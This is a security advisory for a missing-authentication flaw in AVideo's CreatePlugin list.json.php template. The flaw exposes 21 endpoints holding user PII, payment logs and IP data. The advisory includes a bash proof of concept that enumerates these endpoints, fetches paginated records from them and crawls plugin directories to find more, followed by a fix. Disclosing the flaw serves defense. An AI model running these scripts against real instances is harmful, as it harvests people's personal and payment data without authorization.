# [M] AVideo: Missing Authentication in CreatePlugin list.json.php Template Affects 21 Endpoints

## Summary
Severity: Medium
Advisory: GHSA-g2mg-cgr6-vmv7
CVE: CVE-2026-34732
CWE: CWE-306
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-g2mg-cgr6-vmv7
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The AVideo `CreatePlugin` template for `list.json.php` does not include any authentication or authorization check. While the companion templates `add.json.php` and `delete.json.php` both require admin privileges, the `list.json.php` template was shipped without this guard. Every plugin that uses the CreatePlugin code generator inherits this omission, resulting in 21 unauthenticated data listing endpoints across the platform. These endpoints expose sensitive data including user PII, payment transaction logs, IP addresses, user agents, and internal system records.

## Details

The `list.json.php` template in `CreatePlugin/templates/` lacks any authentication check. Comparing with the sibling templates:

```php
// CreatePlugin/templates/add.json.php:12
if (!User::isAdmin()) {
    die('{"error": "Must be admin"}');
}

// CreatePlugin/templates/delete.json.php:11
if (!User::isAdmin()) {
    die('{"error": "Must be admin"}');
}

// CreatePlugin/templates/list.json.php
// NO authentication check - accessible to anyone
```

This template is used by the CreatePlugin generator to scaffold CRUD endpoints for plugin database tables. Every generated `list.json.php` inherits the missing auth check, exposing the table contents to unauthenticated requests.

Confirmed on a live instance, the Meet plugin's join log endpoint returns full records without authentication:

```
GET /plugin/Meet/View/Meet_join_log/list.json.php HTTP/1.1
```

Response (HTTP 200):

```json
{
  "data": [
    {
      "id": 1,
      "users_id": 42,
      "ip": "REDACTED",
      "user_agent": "Mozilla/5.0 ...",
      "created": "2025-01-15 14:32:00",
      "room_name": "private-meeting-xyz"
    }
  ]
}
```

The 21 affected endpoints generated from this template include:

| Endpoint | Exposed Data |
|----------|-------------|
| `plugin/Meet/View/Meet_join_log/list.json.php` | User IDs, IP addresses, user agents, timestamps, room names |
| `plugin/PayPalYPT/View/PayPalYPT_log/list.json.php` | PayPal transaction logs, payment amounts, buyer info |
| `plugin/AuthorizeNet/View/Anet_webhook_log/list.json.php` | Payment webhook data, transaction details |
| `plugin/CustomizeUser/View/Users_extra_info/list.json.php` | Extended user profile data, PII fields |
| `plugin/UserNotifications/View/User_notifications/list.json.php` | User notification records, activity patterns |
| `plugin/UserConnections/View/Users_connections/list.json.php` | Social connection graphs between users |
| And 15+ additional plugin endpoints | Various internal records |

## Proof of Concept

**Step 1:** Enumerate accessible list endpoints (no authentication required):

```bash
#!/bin/bash
TARGET="https://your-avideo-instance.com"

ENDPOINTS=(
  "plugin/Meet/View/Meet_join_log/list.json.php"
  "plugin/PayPalYPT/View/PayPalYPT_log/list.json.php"
  "plugin/AuthorizeNet/View/Anet_webhook_log/list.json.php"
  "plugin/CustomizeUser/View/Users_extra_info/list.json.php"
  "plugin/UserNotifications/View/User_notifications/list.json.php"
  "plugin/UserConnections/View/Users_connections/list.json.php"
)

for endpoint in "${ENDPOINTS[@]}"; do
  echo "=== $endpoint ==="
  HTTP_CODE=$(curl -s -o /tmp/avi037_response.json -w "%{http_code}" "$TARGET/$endpoint")
  echo "Status: $HTTP_CODE"
  if [ "$HTTP_CODE" = "200" ]; then
    echo "VULNERABLE - Data returned:"
    python3 -m json.tool /tmp/avi037_response.json 2>/dev/null | head -20
  fi
  echo ""
done
```

**Step 2:** Retrieve paginated results from a specific endpoint:

```bash
# Fetch meeting join logs with pagination
curl -s "https://your-avideo-instance.com/plugin/Meet/View/Meet_join_log/list.json.php?length=100&start=0" \
  | python3 -m json.tool

# Fetch payment logs
curl -s "https://your-avideo-instance.com/plugin/PayPalYPT/View/PayPalYPT_log/list.json.php?length=100&start=0" \
  | python3 -m json.tool
```

**Step 3:** Discover additional vulnerable endpoints by scanning plugin directories:

```bash
curl -s "https://your-avideo-instance.com/plugin/" \
  | grep -oP 'href="([^"]+)/"' \
  | while read plugin; do
    PLUGIN_NAME=$(echo "$plugin" | grep -oP '"([^"]+)/"' | tr -d '"/')
    URL="$TARGET/plugin/$PLUGIN_NAME/View/"
    curl -s "$URL" | grep -oP 'href="([^"]+)/"' | while read view; do
      VIEW_NAME=$(echo "$view" | grep -oP '"([^"]+)/"' | tr -d '"/')
      LIST_URL="$TARGET/plugin/$PLUGIN_NAME/View/$VIEW_NAME/list.json.php"
      CODE=$(curl -s -o /dev/null -w "%{http_code}" "$LIST_URL")
      [ "$CODE" = "200" ] && echo "FOUND: $LIST_URL"
    done
  done
```

## Impact

21 data listing endpoints across AVideo plugins are accessible without any authentication. An unauthenticated attacker can retrieve:

- **User PII**: Extended profile information, email addresses, user IDs
- **Payment data**: PayPal and Authorize.Net transaction logs, payment amounts, buyer details
- **Access logs**: IP addresses, user agents, timestamps, and behavioral patterns from meeting join logs
- **Social graphs**: User connection and relationship data
- **Activity records**: Notification history revealing user behavior patterns

This is a systemic vulnerability originating from the code generation template, meaning every plugin created with the CreatePlugin generator will have the same issue unless the developer manually adds authentication. The template itself should be fixed to prevent future plugins from inheriting this flaw.

- **CWE-306**: Missing Authentication for Critical Function
- **Severity**: Medium

## Recommended Fix

Add an admin authentication check to `CreatePlugin/templates/list.json.php` after the require lines, matching the pattern used in `add.json.php` and `delete.json.php`:

```php
// CreatePlugin/templates/list.json.php (after the require lines)
if (!User::isAdmin()) {
    die(json_encode(['error' => true]));
}
```

This fixes the template for future plugins. Additionally, retroactively patch all 21 existing generated `list.json.php` endpoints by adding the same admin check after their require lines.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-g2mg-cgr6-vmv7
- https://nvd.nist.gov/vuln/detail/CVE-2026-34732
- https://github.com/WWBN/AVideo/commit/ea9f555850eb399126a103c1df2156b48734c990
- https://github.com/WWBN/AVideo
